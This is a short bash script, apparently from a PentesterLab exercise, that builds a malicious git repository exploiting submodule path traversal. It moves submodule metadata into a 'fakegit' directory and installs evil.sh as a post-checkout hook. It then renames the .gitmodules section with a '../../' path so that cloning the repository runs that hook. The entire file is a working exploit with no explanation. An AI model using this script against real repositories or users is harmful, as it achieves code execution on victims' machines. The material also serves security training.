#!/bin/bash
mkdir malicious.git
cd malicious.git
git init . --bare
cd ../
git clone malicious.git
# Building the structure using 2 submodules
cd malicious
mkdir -p fakegit/modules/
git submodule add https://github.com/pentesterlab/empty.git evil
git submodule add https://github.com/pentesterlab/empty.git aaa
mv .git/modules/evil fakegit/modules/evil
# Make sure your post-checkout script starts with !/bin/sh
rm -f fakegit/modules/evil/hooks/post-checkout
cp /var/www/html/evil.sh fakegit/modules/evil/hooks/post-checkout
chmod 755 fakegit/modules/evil/hooks/post-checkout
# Injecting the directory traversal
git config -f .gitmodules --rename-section submodule.evil submodule.../../fakegit/modules/evil
sed -i 's/\.git/fakegit/' evil/.git
# Pushing the changes
git config user.name "FIRST_NAME LAST_NAME"
git config user.email "MY_NAME@example.com"
git add .
git commit -m "Initial import"
git push